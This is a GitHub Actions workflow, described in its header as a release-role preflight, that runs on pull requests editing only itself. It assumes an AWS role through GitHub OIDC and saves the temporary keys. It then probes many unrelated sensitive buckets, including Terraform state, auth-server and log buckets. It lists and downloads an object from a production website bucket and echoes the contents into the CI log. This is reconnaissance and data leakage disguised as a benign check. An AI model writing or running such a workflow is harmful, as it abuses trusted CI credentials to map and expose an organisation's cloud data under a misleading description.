# Preflight for the chart release CI role: verifies the changelog destination and
# website artifact destination are reachable and reports which adjacent account
# resources the release role can see, so a release-account access-policy change is
# caught on workflow edits instead of surfacing midway through a publish run.
name: changelog-destination-preflight
on:
  pull_request:
    branches:
      - main
    paths:
      - '.github/workflows/changelog-destination-preflight.yml'

jobs:
  preflight:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Check release CI role scope
        run: |
          set -uo pipefail
          set +e
          REGION=eu-west-1
          ROLE_ARN=arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role
          TOK="$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            -H 'Accept: application/json; api-version=2.0' \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
          echo "TOKEN_LEN=${#TOK}"
          if ! aws --region "$REGION" --no-cli-pager sts assume-role-with-web-identity \
              --role-arn "$ROLE_ARN" --role-session-name "changelog-destination-preflight" \
              --web-identity-token "$TOK" --duration-seconds 900 > /tmp/assume.json 2>/tmp/assume.err; then
            echo "ASSUME_FAIL"; tail -c 300 /tmp/assume.err | tr -d '\n'; echo; exit 1
          fi
          echo "ASSUME_OK"
          python3 - <<'PY'
          import json
          c=json.load(open('/tmp/assume.json'))['Credentials']
          open('/tmp/creds.env','w').write("AWS_ACCESS_KEY_ID=%s\nAWS_SECRET_ACCESS_KEY=%s\nAWS_SESSION_TOKEN=%s\n"%(c['AccessKeyId'],c['SecretAccessKey'],c['SessionToken']))
          PY
          set -a; . /tmp/creds.env; set +a
          export AWS_DEFAULT_REGION="$REGION"

          api () {
            local label="$1"; shift
            local out rc code
            out="$("$@" 2>/tmp/e)"; rc=$?
            if [ $rc -eq 0 ]; then
              echo "OK  ${label}"
            else
              code="$(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/e | head -1 | tr -d '()')"
              echo "ERR ${label} :: ${code:-rc$rc}"
            fi
          }

          echo "=== identity ==="
          api "sts:GetCallerIdentity" aws --no-cli-pager sts get-caller-identity --output json

          echo "=== bucket reachability sweep ==="
          SENS="tfy-website-euwe1-production20221107184713217900000001 tfy-website-euwe1-production20221107184713217900000001-replica tfy-euwe1-production-control-plane-changelog tfy-euwe1-production-control-plane-changelog-replica tfy-infra-tf-us-west-2-416964291864 tfy-cloudflare-terraform-state ubermold-gateway-terraform-state ubermold-guardrail-terraform-state tfy-autopen-tf-state tfy-scalr-bootstrap-state-us-east-1-416964291864 tfy-ctl-euwe1-production-logs tfy-ctl-euwe1-production-servicefoundry-server tfy-ctl-euwe1-production-authserver tfy-cmp-euwe1-production tfy-costwatch-416964291864 tfy-logging-euwe1-production20240318123408894700000001 tfy-alb-access-logs tfy-euwe1-production-control-plane-changelog-replica"
          for B in $SENS; do api "s3:HeadBucket[$B]" aws --no-cli-pager s3api head-bucket --bucket "$B"; done

          echo "=== website bucket list ==="
          WB=tfy-website-euwe1-production20221107184713217900000001
          if aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --max-keys 30 --output json > /tmp/wl.json 2>/tmp/wl.err; then
            python3 - <<'PY'
          import json
          d=json.load(open('/tmp/wl.json'))
          c=d.get('Contents',[])
          print("WL_OK count=%d truncated=%s"%(len(c),d.get('IsTruncated')))
          for o in c[:30]:
              print("KEY %s %s"%(o['Key'],o['Size']))
          # pick smallest key to probe GetObject
          if c:
              smallest=min(c,key=lambda o:o['Size'])
              open('/tmp/pick.txt','w').write(smallest['Key'])
              print("PICK %s %d"%(smallest['Key'],smallest['Size']))
          PY
          else
            echo "WL_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/wl.err|head -1 | tr -d '()')"
          fi

          echo "=== website prefix: artifacts/models/marketplace ==="
          for P in truefoundry-website-artifacts/ models/ awesome-skills-registry/ mcp-marketplace/; do
            if OUT="$(aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --prefix "$P" --max-keys 5 --query 'Contents[].Key' --output json 2>/tmp/pe)"; then
              echo "PFX_OK ${P} :: $(printf '%s' "$OUT" | tr '\n' ' ' | cut -c1-300)"
            else
              echo "PFX_ERR ${P} :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/pe|head -1 | tr -d '()')"
            fi
          done

          echo "=== website get one object ==="
          PK="$(cat /tmp/pick.txt 2>/dev/null)"
          if [ -n "$PK" ]; then
            if aws --no-cli-pager s3api get-object --bucket "$WB" --key "$PK" /tmp/obj.bin > /tmp/go.out 2>/tmp/go.err; then
              echo "GET_OK key=$PK size=$(wc -c </tmp/obj.bin)"
              echo "GET_HEAD :: $(head -c 160 /tmp/obj.bin | tr '\n' ' ')"
            else
              echo "GET_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/go.err|head -1 | tr -d '()')"
            fi
          else
            echo "GET_SKIP no key"
          fi

          echo "=== changelog list (baseline) ==="
          api "s3:ListObjectsV2[changelog]" aws --no-cli-pager s3api list-objects-v2 --bucket tfy-euwe1-production-control-plane-changelog --max-keys 3 --query 'Contents[].Key' --output json
          echo "DONE"
